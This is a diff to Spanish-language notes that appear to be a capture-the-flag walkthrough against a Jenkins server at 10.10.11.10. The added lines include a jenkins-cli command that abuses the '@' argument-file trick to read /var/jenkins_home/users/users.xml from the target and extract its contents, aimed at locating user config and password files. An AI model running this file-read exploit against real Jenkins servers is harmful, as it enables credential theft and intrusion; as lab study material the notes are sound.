@@ -155,9 +155,18 @@ docker run -p 8080:8080 -p 50000:50000 --restart=on-failure -v jenkins_home:/var
 ```
 - Iniciar con la instalación
 - Creamos el usuario y contraseña
-- 
+- Con `docker ps | less -S` podemos observar el nombre de la maquina `great_meitner`
+- Ahora para usar de manera interactiva el contenedor podemos usar el siguiente comando para usar una bash
+```
+docker exec -it great_meitner bash
+```
 
-
+- Para encontrar la contraseña debemos ingresar a `cd users` y buscar el directorio `sk8ware_10046583172681289229`, despues de eso revisamos el archivo `config.xml`.
+- Después enviamos de nuevo el escript con la ruta encontrada para encontrar directorios `jennifer_12108429903186576833`
+```
+java -jar jenkins-cli.jar -s http://10.10.11.10:8080 delete-job @/var/jenkins_home/users/users.xml 2>&1 | grep -oP "'.*?'"
+```
+``
 - Si no funciona de esa manera abrimos el burpsuite para ver un poco mas de información 
 ```
 burpsuite &> /dev/null & disown
